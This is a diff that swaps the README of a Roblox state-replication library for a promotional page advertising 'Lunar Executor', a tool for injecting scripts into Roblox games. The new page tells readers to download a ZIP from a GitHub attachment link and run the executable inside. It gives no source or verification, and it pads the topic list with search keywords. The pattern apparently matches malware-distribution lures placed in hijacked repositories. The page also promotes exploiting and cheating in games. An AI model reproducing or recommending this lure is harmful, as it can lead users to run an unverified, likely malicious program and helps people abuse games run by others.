@@ -1,29 +1,119 @@
-# Madwork - ReplicaService
+# LunarExecutor
 
-ReplicaService is a selective state replication system. ReplicaService helps you make server code which changes and replicates any state to select clients.
-
-A state (in layman’s terms, a lua table that may contain almost anything) is wrapped with a Replica - like the name implies, it creates a [replica (identical copy)](https://en.wikipedia.org/wiki/Replica) of the wrapped state on the client-side of users you want to see that state. You may define clients who will see that replica, call mutator functions on the Replica to change the state (will change contents of the wrapped table) and make the clients listen to those changes or simply read the state whenever necessary. Furthermore, a Replica can be parented to another Replica (with a few exceptions discussed later), unloaded for select clients and, of course, destroyed.
-
-What's good about ReplicaService:
-
-- **Just replication, whatever you need replicated** - The goal of ReplicaService is to streamline custom Roblox object replication from server to client. ReplicaService avoids being redundant and tackles as few concerns as possible.
-
-- **Chunks & player houses** - Selective replication allows you to make a "custom [StreamingEnabled](https://developer.roblox.com/en-us/articles/content-streaming) implementation" with full server-side control - load in nearby chunks, load in interiors and furniture only when the player enters those areas!
-
-- **"It don't go brrrrr"** - ReplicaService is completely event-based and only tells the client the data that changes - it keeps the network usage low and conserves computer resources.
-
-- **Go big, go small** - Use custom mutators for minimal bandwith and gain access to client-side listeners that react to bulk changes instead of individual values. Use built-in mutators for rapid implementations while still keeping your network use very low.
-
-If anything is missing or broken, [file an issue on GitHub](https://github.com/MadStudioRoblox/ReplicaService/issues).
-
-If you need help integrating ReplicaService into your project, [join the discussion](https://devforum.roblox.com/t/replicate-your-states-with-replicaservice-networking-system/894736).
+Lunar Executor is a powerful tool designed for harnessing the full potential of Roblox scripting capabilities. With Lunar Executor, users can execute custom scripts within Roblox games, offering them the ability to exploit and modify various game features. This repository serves as the central hub for Lunar Executor, providing essential tools and resources for enhancing your Roblox gaming experience.
 
 ---
-*ReplicaService is part of the **Madwork** framework*
-*Developed by [loleris](https://twitter.com/LM_loleris)*
 
-***It's documented:***
-**[ReplicaService wiki](https://madstudioroblox.github.io/ReplicaService/)**
+## Features
 
-***It's open source:***
-[Roblox library](https://www.roblox.com/library/6015318619/ReplicaService)
+🚀 **Roblox Script Execution:** Lunar Executor allows users to run custom scripts within Roblox games, enabling them to manipulate game functions and mechanics.
+
+🔧 **Game Modification:** Users can exploit and modify different aspects of Roblox games using Lunar Executor, offering flexibility and creativity in gameplay.
+
+🔨 **Script Injection:** Lunar Executor provides a seamless injection process for executing scripts, ensuring smooth integration with Roblox environments.
+
+🛠️ **Enhanced Game Tools:** With Lunar Executor, users gain access to a range of tools and features to further enhance their gaming experience on Roblox.
+
+---
+
+## Repository Structure
+
+The LunarExecutor repository is organized into the following main sections:
+
+- **Scripts:** Contains a collection of sample scripts and resources for use with Lunar Executor.
+- **Documentation:** Provides detailed guides and documentation on how to use Lunar Executor effectively.
+- **Resources:** Supplementary resources and tools to complement the functionality of Lunar Executor.
+
+---
+
+## Quick Start
+
+To get started with Lunar Executor, follow these simple steps:
+
+1. **Download Lunar Executor**: Click the button below to download the Lunar Executor tool.
+
+   [![Download Lunar Executor](https://img.shields.io/badge/Download-Lunar_Executor-brightgreen)](https://github.com/user-attachments/files/16311544/Lunar.zip)
+
+2. **Installation**: Extract the downloaded ZIP file and run the Lunar Executor application.
+
+3. **Script Execution**: Load your custom scripts into Lunar Executor and inject them into your desired Roblox game.
+
+4. **Enjoy**: Explore the new possibilities and functionalities that Lunar Executor offers in your Roblox gaming adventures!
+
+---
+
+## Getting Started with Lunar Executor
+
+### Installation
+
+To install Lunar Executor, follow these steps:
+
+1. Download the latest Lunar Executor ZIP file from the link provided above.
+2. Extract the contents of the ZIP archive to a preferred directory on your system.
+3. Run the Lunar Executor application executable to launch the tool.
+
+### Running Custom Scripts
+
+Lunar Executor provides a user-friendly interface for loading and executing custom scripts. To run your own scripts, follow these steps:
+
+1. Open Lunar Executor and navigate to the 'Scripts' tab.
+2. Click on the 'Load Script' button to select your custom script file.
+3. Once the script is loaded, click on the 'Inject' button to execute the script within the connected Roblox game.
+
+### Modifying Game Features
+
+With Lunar Executor, you can modify various game features and elements to enhance your gameplay experience. Experiment with different scripts and commands to discover new possibilities within Roblox games.
+
+---
+
+## Contributing
+
+We welcome contributions from the community to enhance and improve Lunar Executor. If you have suggestions, bug reports, or feature requests, feel free to submit them through our GitHub repository's [Issues](#) section. Together, we can make Lunar Executor even better for all users.
+
+---
+
+## Repository Topics
+
+The LunarExecutor repository covers a broad range of topics related to Roblox scripting and game modification. Some of the key topics associated with this repository include:
+
+- roblox
+- roblox-download
+- roblox-scripts
+- roblox-script
+- roblox-executor
+- robloxexecutor
+- roblox-injector
+- roblox-tool
+- hack-roblox
+- script-roblox
+- executor-roblox
+- injector-roblox
+- executorroblox
+
+---
+
+## Support
+
+If you encounter any issues or have any questions regarding Lunar Executor, please reach out to our support team for assistance. You can contact us via email at support@lunarexecutor.com or join our official Discord server for real-time support and discussions.
+
+---
+
+## License
+
+Lunar Executor is distributed under the MIT License. For more information on our licensing terms, refer to the [LICENSE](#) file in the repository.
+
+---
+
+## Acknowledgements
+
+We would like to express our gratitude to the Roblox development community for their continuous support and contributions to the scripting ecosystem. Special thanks to all the developers and creators who inspire us to push the boundaries of Roblox gameplay.
+
+---
+
+![Lunar Executor Logo](https://example.com/lunarexecutor.png)
+
+*Explore the limitless possibilities with Lunar Executor!* 🌕
+
+---
+
+Thank you for exploring the LunarExecutor repository. Unleash your creativity and transform your Roblox gaming experience with Lunar Executor today! 🚀
